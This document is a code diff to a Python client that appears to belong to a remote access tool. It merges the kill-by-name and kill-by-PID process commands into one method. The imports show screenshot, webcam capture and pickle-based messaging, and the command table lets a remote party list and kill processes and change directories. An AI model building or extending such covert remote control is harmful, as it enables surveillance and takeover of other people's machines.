@@ -9,7 +9,7 @@ from getpass import getuser
 from datetime import datetime
 from pyscreenshot import grab
 from cv2 import VideoCapture, imencode
-from psutil import process_iter, Process, AccessDenied, NoSuchProcess, pids
+from psutil import process_iter, AccessDenied
 from pathlib import Path
 from json import loads as jloads
 from pickle import loads, dumps
@@ -35,35 +35,23 @@ class Client(object):
     def removeScreenshot(self):
         Path(self.screenshotPath).unlink(missing_ok=True)
     
-    # kills some processes by name
-    def terminateProcess(self, processname):
-        processes = [proc for proc in process_iter() if proc.name().lower() == processname.lower()]
+    # kills some processes by name or pid
+    def terminateProcess(self, processIdentifier):
+        if not processIdentifier.isdigit():
+            processes = [proc for proc in process_iter() if proc.name().lower() == processIdentifier.lower()]
+        else:
+            processes = [proc for proc in process_iter() if proc.pid == int(processIdentifier)]
+        
         if processes:
             try:
                 for process in processes:
                     process.terminate()
                 
-                self.sendHeader({"content": f"[green]Process [yellow]{processname} [green]has been terminated!"})
+                self.sendHeader({"content": f"[green]Process [yellow]{processIdentifier} [green]has been terminated!"})
             except AccessDenied:
-                self.sendHeader({"content": f"[red]Error: Can't terminate process [yellow]{processname}, [red]Access denied"})
+                self.sendHeader({"content": f"[red]Error: Can't terminate process [yellow]{processIdentifier}, [red]Access denied"})
         else:
-            self.sendHeader({"content": f"[red]No processes running with name [yellow]{processname}."})
-
-    # kills some process by pid
-    def killProcess(self, pid):
-        if int(pid) in pids():
-            name = Process(int(pid)).name() # getting name of process to find others with the same name
-            processes = [proc for proc in process_iter() if proc.name().lower() == name.lower()]
-            if processes:
-                try:
-                    for process in processes:
-                        process.terminate()
-                    
-                    self.sendHeader({"content": f"[green]Process [yellow]{pid} [green]has been terminated!"})
-                except AccessDenied:
-                    self.sendHeader({"content": f"[red]Error: Can't terminate process [yellow]{pid}, [red]Access denied"})
-        else:
-            self.sendHeader({"content": f"[red]No process running with PID [yellow]{pid}."})
+            self.sendHeader({"content": f"[red]No processes running with identifier [yellow]{processIdentifier}."})
 
     # getting info of only one process
     def getProcessInfo(self, processname):
@@ -217,7 +205,6 @@ class Client(object):
             "/processlist": {"action": self.getProcessList},
             "/processinfo": {"action": self.getProcessInfo},
             "/terminateprocess": {"action": self.terminateProcess},
-            "/killprocess": {"action": self.killProcess},
             "cd": {"action": self.changeDirectory}
         }
 
